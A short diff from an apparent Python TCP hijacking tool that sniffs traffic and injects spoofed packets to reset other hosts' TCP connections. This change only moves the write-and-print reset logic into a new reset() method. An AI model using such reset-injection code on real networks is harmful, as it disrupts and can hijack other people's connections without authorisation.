@@ -21,7 +21,6 @@ class TCP_Hijack(object):
         self.sniffer = Sniffer()
         self.sniffer.init(self.iface)
         self.unique_id = base64.b64encode(str(random.randint(0, 10000)))
-        self.killed = {}
 
     def pkt_builder(self, packet):
         self.wire = libnet.context(LINK, self.iface)
@@ -45,15 +44,18 @@ class TCP_Hijack(object):
                                           src = self.wire.hex_aton(packet['ETH_DHOST'])
                                          )
 
+    def reset(self, packet):
+        self.wire.write()
+        bytes_written = self.wire.stats()['bytes_written']
+        print("{}: resetting {} <------> {}".format(bytes_written, packet['IP_SRC'], packet['IP_DST']))
+        del self.wire
+
     def pkt_handle(self, packet):
         try:
             if packet['IP_PROTO'] == IPPROTO_TCP:
                 if self.unique_id not in packet['TCP_PAYLOAD']:
                     self.pkt_builder(packet)
-                    self.wire.write()
-                    bytes_written = self.wire.stats()['bytes_written']
-                    print("{}: resetting {} <------> {}".format(bytes_written, packet['IP_SRC'], packet['IP_DST']))
-                    del self.wire
+                    self.reset(packet)
         except KeyError: return -1
 
     def kill(self):
